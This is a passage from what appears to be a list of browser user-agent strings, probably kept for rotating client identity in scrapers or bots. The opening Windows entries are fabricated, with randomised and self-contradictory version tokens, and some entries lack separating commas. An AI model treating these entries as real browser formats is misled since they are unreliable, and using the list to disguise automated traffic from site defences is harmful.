Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S583I) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4853.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C449R) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4637.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J908A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4667.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U921A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4760.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L525A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4418.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K497Y) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4518.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I301P) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4427.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A352M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4423.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A684P) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4710.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L679E) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4509.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F745Y) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4511.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C46A) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4215.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F376J) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4763.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M790H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4533.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F824J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4553.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J126J) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4348.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q27V) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4315.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J770M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4326.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T317O) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4471.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W251T) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4363.87 Chrome/105.0.0.0 Safari/537.36',
"Mozilla/5.0 (Linux; Android 11; Redmi K30i 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; XQ-AS72) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Mi 8T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
"Mozilla/5.0 (Linux; Android 11; LM-K830) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
"Mozilla/5.0 (Android 13; Mobile; LG-M255; rv:106.0) Gecko/106.0 Firefox/106.0",
"Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;]",
"Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.118 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]",
"Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",
"Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]",
"Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114",
"Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",
"Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",
"Mozilla/5.0 (Linux; Android 12; SM-E225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",
"Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]",
"Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",
"Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/386.0.0.35.108;]",
"Mozilla/5.0 (Linux; U; Android 12; SM-A716U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/8.7.2254.57310",
"Mozilla/5.0 (Linux; U; Android 12; SM-A716V Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 OPR/9.0.2254.57848",
"Mozilla/5.0 (Linux; U; Android 10; SM-A716U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 OPR/9.0.2254.57848",
"Mozilla/5.0 (Linux; U; Android 12; SM-A716U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 OPR/8.7.2254.57455",
"Mozilla/5.0 (Linux; U; Android 12; SM-A716U1 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/10.6.2254.62600",
"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A716U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Mobile Safari/537.36 EdgA/104.0.1293.47",
"Mozilla/5.0 (Linux; Android 11; SM-A716V Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.41 Mobile Safari/537.36 TapResearch Multi Window",
"Mozilla/5.0 (Linux; Android 11; SM-A716U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/364.0.0.24.132;]",
"Mozilla/5.0 (Linux; Android 11; SM-A716U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/355.0.0.17.114;]",
"Mozilla/5.0 (Linux; Android 11; SM-A716U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/342.0.0.37.119;]",
"Mozilla/5.0 (Linux; Android 11; SM-A716U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/333.0.0.17.119;]",
"Mozilla/5.0 (Linux; Android 11; SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 EdgA/97.0.1072.55",
"Mozilla/5.0 (Linux; Android 12; SM-N981U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-N981U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N981B/N981BXXS5FVH7) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]",
"Mozilla/5.0 (Linux; Android 10; SM-N981B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/279.0.0.19.120;]",
"Mozilla/5.0 (Linux; Android 12; SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Mobile Safari/537.36 EdgA/104.0.1293.47",
"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N9810) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-N981U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]",
"Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/362.0.0.27.109;]",
"Mozilla/5.0 (Linux; Android 12; SM-N981U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/365.0.0.30.112;]",
"Mozilla/5.0 (Linux; Android 11; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Mobile Safari/537.36 EdgA/103.0.1264.47",
"Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]",
"Mozilla/5.0 (Linux; U; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/10.6.2254.62601",
"Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-M315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/225.0.0.9.114;] [ip:213.32.4.102]",
"Mozilla/5.0 (Android 10; samsung SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0",
"Mozilla/5.0 (Linux; Android 10; SM-M315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/290.0.0.16.119;]",
"Mozilla/5.0 (Linux; Android 10; SM-M315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 AlohaLite/1.5.0 AlohaBrowser/2.14.1",
"Mozilla/5.0 (Linux; Android 11; SM-M315F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 YaBrowser/22.1.0.194 (lite) Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-M315F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]",
"Mozilla/5.0 (Linux; Android 11; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/3.0.2 Chrome/89.0.4389.72 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 WpsMoffice/16.4/arm64-v8a/1334",
"Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 WpsMoffice/16.3.3/arm64-v8a/1329",
"Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.24.109;]",
"Mozilla/5.0 (Linux; Android 12; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Mobile Safari/537.36 EdgA/104.0.1293.47",
"Mozilla/5.0 (Linux; Android 10; SM-M315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 AlohaLite/1.5.0 AlohaBrowser/2.14.1",
"Mozilla/5.0 (Linux; Android 11; SM-M315F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 YaBrowser/22.1.0.194 (lite) Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G998U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 EdgA/109.0.0.0",
"Mozilla/5.0 (Linux; Android 12; SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 EdgA/108.0.1462.15",
"Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.28 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-M315FD Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 WpsMoffice/16.4/arm64-v8a/1334",
"Mozilla/5.0 (Linux; Android 12; SM-M315L Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 WpsMoffice/16.3.3/arm64-v8a/1329",
"Mozilla/5.0 (Linux; Android 12; SM-M315N Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.24.109;]",
"Mozilla/5.0 (Linux; Android 12; SM-M315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Mobile Safari/537.36 EdgA/104.0.1293.47",
"Mozilla/5.0 (Linux; Android 10; SM-M315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 AlohaLite/1.5.0 AlohaBrowser/2.14.1",
"Mozilla/5.0 (Linux; Android 11; SM-M315K Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 YaBrowser/22.1.0.194 (lite) Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G998U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 EdgA/109.0.0.0",
"Mozilla/5.0 (Linux; Android 12; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 EdgA/108.0.1462.15",
"Mozilla/5.0 (Linux; Android 12; SM-G998F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.28 Mobile Safari/537.36", 
"Mozilla/5.0 (Linux; U; Android 12; SM-G998U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/8.7.2254.57455"
"Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.22 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 11; SM-G998U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/8.7.2254.57455",
"Mozilla/5.0 (Linux; Android 12; SM-G9980 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Line/12.15.1/IAB",
"Mozilla/5.0 (Linux; U; Android 12; SM-A526U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/8.7.2254.57310",
"Mozilla/5.0 (Linux; U; Android 12; SM-A526U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/8.7.2254.57455",
"Mozilla/5.0 (Linux; U; Android 12; SM-A526U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36 OPR/8.7.2254.57455",
"Mozilla/5.0 (Linux; Android 12; SM-A526U1 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 12; SM-A526U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 OPR/8.6.2254.56868",
"Mozilla/5.0 (Linux; Android 11; SM-A526U1 Build/RP1A.200720.012; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 BingSapphire/23.0.400802306",
"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A526U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A526B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]",
"Mozilla/5.0 (Linux; Android 12; SM-A526W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Mobile Safari/537.36 EdgA/81.0.416.58",
"Mozilla/5.0 (Linux; Android 12; SM-A315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36 OkKey/CBAFJIICABABABABA OKAndroid/22.6.7 b22060700 OkApp",
"Mozilla/5.0 (Linux; Android 12; SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A315G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/389.0.0.42.111;]",
"Mozilla/5.0 (Linux; Android 11; SM-A315G Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.77 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-A315G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.77 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-A315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/225.0.0.12.114;]",
"Mozilla/5.0 (Linux; Android 10; SM-A315G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/284.0.0.16.119;]",
"Mozilla/5.0 (Linux; Android 10; SM-A315G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/217.0.0.14.121;]",
"Mozilla/5.0 (Linux; Android 10; SM-A315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36 Flipboard/4.2.49/4925,4.2.49.4925",
"Mozilla/5.0 (Linux; Android 10; SM-A315F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 Flipboard/4.2.45/4889,4.2.45.4889",
"Mozilla/5.0 (Linux; Android 13; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G977N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Zenfone Max Pro M1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Redmi K20 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; J8110) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; XQ-AT52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-T870 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.1.3381.61266",
"Mozilla/5.0 (Linux; Android 12; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; moto g(8) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Mobile Safari/537.36 EdgA/96.0.1054.36",
"Mozilla/5.0 (Linux; Android 12; Redmi Note 5 Build/SP1A.211105.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420",
"Mozilla/5.0 (Linux; Android 12; SM-G998U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36",
